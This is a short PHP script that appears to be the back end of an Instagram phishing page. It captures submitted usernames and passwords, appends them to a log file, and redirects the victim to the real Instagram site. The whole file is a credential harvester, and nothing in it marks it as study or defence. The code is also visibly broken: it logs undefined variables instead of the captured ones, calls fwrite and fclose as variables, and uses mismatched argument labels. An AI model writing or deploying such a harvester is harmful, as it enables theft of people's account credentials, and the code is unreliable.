<?php


$username = $_POST['username'];
$password = $_POST['password'];

$fp = fopen(filename:'log.txt', mode:'a+');
$fwrite($fp, string: 'Username: ' . $login . "\n");
$fwrite($fp, string: 'Password: ' . $pass . "\n");
$fwrite($fp, string: '-----------------' . "\n");
$fclose($fp);

header( string: 'Location: https://instagram.com');
